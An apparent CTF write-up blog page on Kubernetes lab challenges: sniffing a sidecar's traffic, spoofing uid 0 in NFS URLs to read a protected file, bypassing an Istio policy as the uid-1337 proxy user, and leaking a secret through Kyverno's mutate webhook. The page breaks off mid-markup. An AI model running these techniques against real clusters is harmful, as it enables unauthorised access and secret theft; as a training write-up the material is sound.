<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>k8s lan party | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="Long time no CTF~~
RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
This blog is good written link
Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="k8s lan party" />
<meta property="og:description" content="Long time no CTF~~
RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
This blog is good written link
Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/" />
<meta property="og:image" content="https://ch3n9w.cpolar.cn/2024-03-26-21-02-36.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-15T07:34:46+00:00" />
<meta property="article:modified_time" content="2024-03-15T07:34:46+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://ch3n9w.cpolar.cn/2024-03-26-21-02-36.png" />
<meta name="twitter:title" content="k8s lan party"/>
<meta name="twitter:description" content="Long time no CTF~~
RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
This blog is good written link
Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "k8s lan party",
      "item": "https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "k8s lan party",
  "name": "k8s lan party",
  "description": "Long time no CTF~~\nRECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan\nThis blog is good written link\nFinding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.\nAs we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.",
  "keywords": [
    
  ],
  "articleBody": "Long time no CTF~~\nRECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan\nThis blog is good written link\nFinding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.\nAs we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.\ntcpdump -i any host reporting-service.k8s-lan-party.svc.cluster.local and tcp -w traffic.pcap and the flag was in the traffic.pcap\nDATA LEAKAGE The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.\nAt first glance, I thought the data storage is nfs, and found the existence of /efs/flag.txt. However, there is no enough permission to read it, while I failed to mount the remote storage to local host, so I stopped and didn’t have any progress until the end of the game.\nBy executing mount, here we got:\nfs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.30.72,local_lock=none,addr=192.168.124.98) Since the remote storage use nfs4, we should specify the version when listing it.\nnfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4 try to cat the remote flag.txt, but there is no enough permission.\nnfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4 However, according to the libnfs document, we could spoof uid and gid by adding parameters to the nfs url and get elevated privileges.\nnfs-cat \"nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4\u0026uid=0\u0026gid=0\" The Beauty and The Ist Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don’t abuse this power; use it responsibly and with caution.\nThe given policy is\napiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: istio-get-flag namespace: k8s-lan-party spec: action: DENY selector: matchLabels: app: \"{flag-pod-name}\" rules: - from: - source: namespaces: [\"k8s-lan-party\"] to: - operation: methods: [\"POST\", \"GET\"] The policy in this challenge block GET and POST requests from namespace k8s-lan-party Find Istio service\ndnscan -subnet 10.100.0.1/16 The request to this address will be denied. However, there seems to be user that can bypass the Istio’s IPTables rules from hist#2.\ncat /etc/passwd | grep 1337\nAnd we got user istio, According to ncc report and Istio Iptables, the 1337 uid is used to distinguish between traffic originating from proxy vs the applications, which means we can bypass the policy restriction by switching to user istio and send requests, which would be recognized as traffic from istio sidercar proxy.\nWho will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.\nThe given policy:\napiVersion: kyverno.io/v1 kind: Policy metadata: name: apply-flag-to-env namespace: sensitive-ns spec: rules: - name: inject-env-vars match: resources: kinds: - Pod mutate: patchStrategicMerge: spec: containers: - name: \"*\" env: - name: FLAG value: \"{flag}\" Kyverno is designed for policy management. The policy will inject flag into Pod resource created under sensitive-ns.\nAccording to GPT, AdmissionReview is a kind of API resource used in admission control process. K8s supports two types of admission control webhooks to handle AdmissionReview: ValidatingAdmissionWebhook and MutatingAdmissionWebhook, the latter is called before validating object correctness, it can modify objects in the request, while the former is called after all MutatingAdmissionWebhook to check the state of the object for validity but does not modify it.\nObviously, the policy facilitates MutatingAdmissionWebhook to modify object.\nReconnoiter services first:\n10.100.86.210 -\u003e kyverno-cleanup-controller.kyverno.svc.cluster.local. 10.100.217.223 -\u003e kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local. 10.100.232.19 -\u003e kyverno-svc.kyverno.svc.cluster.local. 10.100.126.98 -\u003e kyverno-svc-metrics.kyverno.svc.cluster.local. 10.100.158.213 -\u003e kyverno-reports-controller-metrics.kyverno.svc.cluster.local. 10.100.171.174 -\u003e kyverno-background-controller-metrics.kyverno.svc.cluster.local. What if we can utilize the MutatingAdmissionWebhook to steal the secret since we can access to https://kyverno-svc.kyverno.svc.cluster.local/mutate? The AdmissionReview requests to this api will be responsed by object modified by the kyverno, which makes a lot sense.\nuse the following resource to generate AdmissionReview\napiVersion: v1 kind: Pod metadata: name: curl-flag namespace: sensitive-ns spec: containers: - name: curl-container image: curlimages/curl ./kube-review create pod.yaml \u003e pod.json curl -k -X POST \\ https://kyverno-svc.kyverno.svc.cluster.local/mutate \\ -H 'content-type: application/json' \\ --data-binary \"@pod.json\" We got:\n{\"kind\":\"AdmissionReview\",\"apiVersion\":\"admission.k8s.io/v1\",\"request\":{\"uid\":\"dd916513-9b96-4220-ae2b-b21470612d69\",\"kind\":{\"group\":\"\",\"version\":\"v1\",\"kind\":\"Pod\"},\"resource\":{\"group\":\"\",\"version\":\"v1\",\"resource\":\"pods\"},\"requestKind\":{\"group\":\"\",\"version\":\"v1\",\"kind\":\"Pod\"},\"requestResource\":{\"group\":\"\",\"version\":\"v1\",\"resource\":\"pods\"},\"name\":\"curl-flag\",\"namespace\":\"sensitive-ns\",\"operation\":\"CREATE\",\"userInfo\":{\"username\":\"kube-review\",\"uid\":\"ee8332cb-afa6-412e-b60a-641f23d28980\"},\"object\":{\"kind\":\"Pod\",\"apiVersion\":\"v1\",\"metadata\":{\"name\":\"curl-flag\",\"namespace\":\"sensitive-ns\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"curl-container\",\"image\":\"curlimages/curl\",\"resources\":{}}]},\"status\":{}},\"oldObject\":null,\"dryRun\":true,\"options\":{\"kind\":\"CreateOptions\",\"apiVersion\":\"meta.k8s.io/v1\"}},\"response\":{\"uid\":\"dd916513-9b96-4220-ae2b-b21470612d69\",\"allowed\":true,\"patch\":\"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d\",\"patchType\":\"JSONPatch\"}} ",
  "wordCount" : "674",
  "inLanguage": "en",
  "image":"https://ch3n9w.cpolar.cn/2024-03-26-21-02-36.png","datePublished": "2024-03-15T07:34:46Z",
  "dateModified": "2024-03-15T07:34:46Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      k8s lan party
    </h1>
    <div class="post-meta"><span title='2024-03-15 07:34:46 +0000 UTC'>March 15, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;674 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36_hu117aeb1ed1a80debcce6d3a22021de16_176645_360x0_resize_box_3.png 360w ,https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36_hu117aeb1ed1a80debcce6d3a22021de16_176645_480x0_resize_box_3.png 480w ,https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36_hu117aeb1ed1a80debcce6d3a22021de16_176645_720x0_resize_box_3.png 720w ,https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36_hu117aeb1ed1a80debcce6d3a22021de16_176645_1080x0_resize_box_3.png 1080w ,https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36.png 1464w" 
            sizes="(min-width: 768px) 720px, 100vw" src="https://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/2024-03-26-21-02-36.png" alt="" 
            width="1464" height="498">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#recon">RECON</a></li>
    <li><a href="#finding-neighbours">Finding Neighbours</a></li>
    <li><a href="#data-leakage">DATA LEAKAGE</a></li>
    <li><a href="#the-beauty-and-the-ist">The Beauty and The Ist</a></li>
    <li><a href="#who-will-guard-the-guardians">Who will guard the guardians?</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>Long time no CTF~~</p>
<h2 id="recon">RECON<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
<p>Just check the environment related to K8s using <code>env</code> and reconnoiter internal service using <code>dnscan</code></p>
<p><img loading="lazy" src="recon.png" alt="recon"  />
</p>
<p>This blog is good written <a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html">link</a></p>
<h2 id="finding-neighbours">Finding Neighbours<a hidden class="anchor" aria-hidden="true" href="#finding-neighbours">#</a></h2>
<p>According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to <code>reporting-service.k8s-lan-party.svc.cluster.local</code>.</p>
<p>As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>tcpdump -i any host reporting-service.k8s-lan-party.svc.cluster.local and tcp -w traffic.pcap
</span></span></code></pre></div><p>and the flag was in the <code>traffic.pcap</code></p>
<p><img loading="lazy" src="neighbours.png" alt="neighbours"  />
</p>
<h2 id="data-leakage">DATA LEAKAGE<a hidden class="anchor" aria-hidden="true" href="#data-leakage">#</a></h2>
<blockquote>
<p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.</p>
</blockquote>
<p>At first glance, I thought the data storage is <code>nfs</code>, and found the existence of <code>/efs/flag.txt</code>. However, there is no enough permission to read it, while I failed to mount the remote storage to local host, so I stopped and didn&rsquo;t have any progress until the end of the game.</p>
<p>By executing <code>mount</code>, here we got:</p>
<pre tabindex="0"><code>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.30.72,local_lock=none,addr=192.168.124.98)
</code></pre><p>Since the remote storage use <code>nfs4</code>, we should specify the version when listing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p>try to cat the remote <code>flag.txt</code>, but there is no enough permission.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p><img loading="lazy" src="2024-03-26-20-45-47.png" alt=""  />
</p>
<p>However, according to the libnfs document, we could spoof uid and gid by adding parameters to the nfs url and get elevated privileges.</p>
<p><img loading="lazy" src="2024-03-26-20-52-11.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nfs-cat <span style="color:#e6db74">&#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&amp;gid=0&#34;</span>
</span></span></code></pre></div><p><img loading="lazy" src="2024-03-26-20-51-30.png" alt=""  />
</p>
<h2 id="the-beauty-and-the-ist">The Beauty and The Ist<a hidden class="anchor" aria-hidden="true" href="#the-beauty-and-the-ist">#</a></h2>
<blockquote>
<p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&rsquo;t abuse this power; use it responsibly and with caution.</p>
</blockquote>
<p>The given policy is</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">security.istio.io/v1beta1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">AuthorizationPolicy</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">istio-get-flag</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">k8s-lan-party</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">action</span>: <span style="color:#ae81ff">DENY</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#e6db74">&#34;{flag-pod-name}&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">from</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">source</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">namespaces</span>: [<span style="color:#e6db74">&#34;k8s-lan-party&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">to</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">operation</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">methods</span>: [<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;GET&#34;</span>]
</span></span></code></pre></div><p>The policy in this challenge block <code>GET</code> and <code>POST</code> requests from namespace <code>k8s-lan-party</code>
Find Istio service</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dnscan -subnet 10.100.0.1/16
</span></span></code></pre></div><p><img loading="lazy" src="2024-03-26-21-10-53.png" alt=""  />
</p>
<p>The request to this address will be denied. However, there seems to be user that can bypass the Istio&rsquo;s IPTables rules from hist#2.</p>
<p><code>cat /etc/passwd | grep 1337</code></p>
<p>And we got user <code>istio</code>, According to <a href="https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf">ncc report</a> and <a href="https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables">Istio Iptables</a>, <strong>the 1337 uid is used to distinguish between traffic originating from proxy vs the applications</strong>, which means we can bypass the policy restriction by switching to user <code>istio</code> and send requests, which would be recognized as traffic from istio sidercar proxy.</p>
<p><img loading="lazy" src="2024-03-26-21-18-32.png" alt=""  />
</p>
<h2 id="who-will-guard-the-guardians">Who will guard the guardians?<a hidden class="anchor" aria-hidden="true" href="#who-will-guard-the-guardians">#</a></h2>
<blockquote>
<p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p>
</blockquote>
<p>The given policy:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">kyverno.io/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Policy</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">apply-flag-to-env</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">sensitive-ns</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">inject-env-vars</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">match</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resources</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">kinds</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">mutate</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">patchStrategicMerge</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>              - <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;*&#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">env</span>:
</span></span><span style="display:flex;"><span>                  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">FLAG</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">value</span>: <span style="color:#e6db74">&#34;{flag}&#34;</span>
</span></span></code></pre></div><p>Kyverno is designed for policy management. The policy will inject flag into Pod resource created under <code>sensitive-ns</code>.</p>
<p>According to GPT, <code>AdmissionReview</code> is a kind of API resource used in admission control process. K8s supports two types of admission control webhooks to handle <code>AdmissionReview</code>: <code>ValidatingAdmissionWebhook</code> and <code>MutatingAdmissionWebhook</code>, the latter is called before validating object correctness, it can modify objects in the request, while the former is called after all <code>MutatingAdmissionWebhook</code> to check the state of the object for validity but does not modify it.</p>
<p>Obviously, the policy facilitates MutatingAdmissionWebhook to modify object.</p>
<p>Reconnoiter services first:</p>
<pre tabindex="0"><code>10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.
10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.
</code></pre><p>What if we can utilize the MutatingAdmissionWebhook to steal the secret since we can access to <code>https://kyverno-svc.kyverno.svc.cluster.local/mutate</code>? The AdmissionReview requests to this api will be responsed by object modified by the kyverno, which makes a lot sense.</p>
<p>use the following resource to generate <code>AdmissionReview</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">curl-flag</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">sensitive-ns</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">curl-container</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">curlimages/curl</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./kube-review create pod.yaml &gt; pod.json
</span></span><span style="display:flex;"><span>curl -k -X POST <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>https://kyverno-svc.kyverno.svc.cluster.local/mutate <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;content-type: application/json&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-binary <span style="color:#e6db74">&#34;@pod.json&#34;</span>
</span></span></code></pre></div><p>We got:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;AdmissionReview&#34;</span>,<span style="color:#f92672">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;admission.k8s.io/v1&#34;</span>,<span style="color:#f92672">&#34;request&#34;</span>:{<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;dd916513-9b96-4220-ae2b-b21470612d69&#34;</span>,<span style="color:#f92672">&#34;kind&#34;</span>:{<span style="color:#f92672">&#34;group&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#f92672">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Pod&#34;</span>},<span style="color:#f92672">&#34;resource&#34;</span>:{<span style="color:#f92672">&#34;group&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span 